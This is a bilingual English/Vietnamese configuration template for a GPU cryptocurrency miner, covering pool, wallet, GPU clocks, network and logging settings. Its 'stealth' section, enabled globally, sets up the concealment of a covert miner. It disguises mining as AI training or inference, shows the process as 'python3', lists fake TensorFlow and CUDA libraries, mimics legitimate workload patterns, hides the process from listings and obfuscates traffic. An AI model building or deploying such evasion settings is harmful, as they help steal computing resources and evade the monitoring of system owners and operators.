# GPU Mining Configuration Template
# Cấu hình mẫu cho hệ thống mining GPU

# Mining configuration - Cấu hình khai thác
[mining]
# Mining algorithm (kawpow, ethash, autolykos2, octopus)
# Thuật toán khai thác
algorithm = "kawpow"

# Pool address - Địa chỉ pool
# Format: stratum+tcp://pool.example.com:3333
pool_address = "stratum+tcp://pool.example.com:3333"

# Wallet address - Địa chỉ ví
# Your cryptocurrency wallet address
wallet_address = "YOUR_WALLET_ADDRESS_HERE"

# Worker name - Tên worker
# Identifier for this mining instance
worker_name = "gpu-worker-01"

# Use TLS encryption - Sử dụng mã hóa TLS
use_tls = true

# Mining intensity (0-100) - Cường độ khai thác
# Higher = more GPU usage, more heat
intensity = 75

# Auto-switch to most profitable algorithm
# Tự động chuyển sang thuật toán có lợi nhất
auto_switch = false

# Developer fee percentage (0-5)
# Phí phát triển
dev_fee = 1.0

# GPU configuration - Cấu hình GPU
[gpu]
# GPU indices to use - Chỉ số GPU sử dụng
# [0] = first GPU, [0,1] = first two GPUs
gpu_indices = [0]

# Minimum CUDA compute capability
# Khả năng tính toán CUDA tối thiểu
min_compute_capability = 6.0

# Memory clock offset in MHz - Offset xung nhịp bộ nhớ
# Positive = overclock, Negative = underclock
mem_clock_offset = 0

# Core clock offset in MHz - Offset xung nhịp lõi
core_clock_offset = 0

# Power limit percentage (50-100) - Giới hạn công suất
power_limit = 80

# Target temperature in Celsius - Nhiệt độ mục tiêu
target_temp = 70

# Maximum temperature before throttling - Nhiệt độ tối đa
max_temp = 85

# Fan control mode (auto, manual, aggressive)
# Chế độ điều khiển quạt
fan_mode = "auto"

# Stealth configuration - Cấu hình ẩn danh
[stealth]
# Wrapper mode for disguising mining activity
# Chế độ ngụy trang hoạt động mining
# Options: ai_training, image_processing, scientific_computing, ai_inference
wrapper_mode = "ai_training"

# Process name to display - Tên process hiển thị
process_name = "python3"

# Fake libraries to reference - Thư viện giả để tham chiếu
fake_libs = [
    "libtensorflow.so",
    "libcudnn.so",
    "libcublas.so"
]

# Mimic legitimate workload patterns
# Mô phỏng pattern của workload hợp pháp
mimic_patterns = true

# Random variation in resource usage (%)
# Biến động ngẫu nhiên trong sử dụng tài nguyên
usage_jitter = 10

# Time between pattern changes (seconds)
# Thời gian giữa các thay đổi pattern
pattern_interval = 300

# Hide process from listing - Ẩn process khỏi danh sách
hide_process = true

# Obfuscate network traffic - Làm rối traffic mạng
obfuscate_traffic = true

# Network configuration - Cấu hình mạng
[network]
# Connection timeout in seconds - Timeout kết nối
timeout = 30

# Number of retry attempts - Số lần thử lại
retry_attempts = 3

# Delay between retries in seconds - Delay giữa các lần thử
retry_delay = 5

# DNS servers to use - DNS servers sử dụng
dns_servers = ["8.8.8.8", "1.1.1.1"]

# Use Tor for anonymity - Sử dụng Tor để ẩn danh
use_tor = false

# Proxy configuration (optional) - Cấu hình proxy
# [network.proxy]
# proxy_type = "socks5"
# address = "127.0.0.1"
# port = 9050
# username = ""
# password = ""

# Logging configuration - Cấu hình logging
[logging]
# Log directory path - Đường dẫn thư mục log
log_dir = "/app/logs"

# Maximum log file size in MB - Kích thước file log tối đa
max_size_mb = 100

# Maximum number of log files to keep
# Số lượng file log giữ lại tối đa
max_files = 5

# Log to stdout - Ghi log ra stdout
log_stdout = true

# Log to file - Ghi log ra file
log_file = true

# Encrypt log files - Mã hóa file log
encrypt_logs = false

# Remote logging endpoint (optional)
# Endpoint logging từ xa
# remote_endpoint = "http://logging.example.com:9090/metrics"

# Global settings - Cài đặt toàn cục
# Enable stealth mode - Bật chế độ ẩn
stealth_enabled = true

# Log level (trace, debug, info, warn, error)
# Mức độ log
log_level = "info"
